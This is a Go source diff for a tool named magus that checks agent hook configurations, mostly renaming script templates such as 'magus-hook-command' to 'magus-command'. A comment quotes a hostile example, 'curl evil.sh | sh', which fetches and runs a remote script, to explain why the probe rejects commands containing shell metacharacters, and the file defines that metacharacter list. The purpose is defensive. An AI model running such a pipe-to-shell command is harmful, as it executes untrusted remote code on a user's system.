@@ -22,7 +22,7 @@ const probeTimeout = 10 * time.Second
 // guardUnavailableNotice is the literal English magus's own shipped guard scripts
 // print when they could not resolve or run a working binary. It is magus's own
 // diagnostic vocabulary, authored once and reused verbatim across every template
-// (see docs/guides/integrations/agents/magus-hook-command.sh and cursor-hook.sh),
+// (see docs/guides/integrations/agents/magus-command.sh and cursor-hook.sh),
 // not a host's, so matching it here reads a fact the script already states rather
 // than guessing at a host's reply dialect.
 const guardUnavailableNotice = "magus guard is NOT running"
@@ -55,7 +55,7 @@ const (
 // for those, and the exact-entry match VerifyHarness already ran is that check.
 func probeable(command string) bool {
 	switch {
-	case namesTemplate(command, "magus-hook-observe"),
+	case namesTemplate(command, "magus-observe"),
 		namesTemplate(command, "magus-checkpoint"),
 		namesTemplate(command, "magus-rehydrate"):
 		return false
@@ -80,8 +80,8 @@ const probeMetacharacters = ";&|<>()$`\n\r\\\"'{}*?[]~!#"
 //
 // invokesMagus is not that question and must not be used as though it were. It asks
 // whether a config invokes magus at all, for coverage reporting, and it answers with
-// substring tests: `strings.Contains(command, "magus-hook-")` is true of
-// `curl evil.sh | sh; sh magus-hook-command.sh`, which is one string containing a shipped
+// substring tests: `strings.Contains(command, "magus-command")` is true of
+// `curl evil.sh | sh; sh magus-command.sh`, which is one string containing a shipped
 // basename and one command line doing something else entirely.
 //
 // That distinction is load-bearing because of WHERE the command comes from. A descriptor
@@ -92,9 +92,9 @@ const probeMetacharacters = ";&|<>()$`\n\r\\\"'{}*?[]~!#"
 //
 // So the test is shape, not content: optional NAME=value assignments, then a program and
 // its arguments, and not one character that could start a second command, expand, or
-// redirect. Everything magus ships passes (`HOST_EVENT_RAW=1 sh docs/.../magus-hook-command.sh`),
+// redirect. Everything magus ships passes (`HOST_EVENT_RAW=1 sh docs/.../magus-command.sh`),
 // and nothing that composes commands does, in either shipped form (`magus buzz -s
-// docs/.../magus-hook-command.buzz` too). A command this rejects is still REPORTED by
+// docs/.../magus-command.buzz` too). A command this rejects is still REPORTED by
 // the coverage path; it is only never run.
 func runnableAsProbe(command string) bool {
 	if strings.ContainsAny(command, probeMetacharacters) {
@@ -135,7 +135,7 @@ func isEnvName(s string) bool {
 // host-neutral BY CONSTRUCTION: magus never has to parse a host's JSON envelope
 // to know what decision came back.
 func supportsHostResponseOverride(command string) bool {
-	return namesTemplate(command, "magus-hook-command") || namesTemplate(command, "magus-hook-path")
+	return namesTemplate(command, "magus-command") || namesTemplate(command, "magus-path")
 }
 
 // probeEventFor picks the synthetic event a command's own script expects, and
@@ -147,9 +147,9 @@ func supportsHostResponseOverride(command string) bool {
 // already uses: a filename is a shipped artifact, not a host.
 func probeEventFor(command string) (event string, wantDecisions []string) {
 	switch {
-	case namesTemplate(command, "magus-hook-command"):
+	case namesTemplate(command, "magus-command"):
 		return probeDenyCommandEvent, []string{"deny"}
-	case namesTemplate(command, "magus-hook-path"):
+	case namesTemplate(command, "magus-path"):
 		return probeAdvisePathEvent, []string{"advise"}
 	case strings.Contains(command, "cursor-hook.sh"):
 		return probeCursorShellDenyEvent, nil
@@ -216,7 +216,7 @@ func probeHarnessCommands(ctx context.Context, root string, config map[string]an
 // its event), or no magus binary the script could possibly resolve (its own root
 // walk, then PATH). Answering this up front means a probe that cannot run says so
 // exactly, rather than the ambiguous empty output a missing binary alone would
-// otherwise leave behind on a script (magus-hook-path.sh) that is silent by
+// otherwise leave behind on a script (magus-path.sh) that is silent by
 // design when it cannot find one.
 func checkProbeEnvironment(root string) (reason string, ok bool) {
 	if _, err := exec.LookPath("sh"); err != nil {
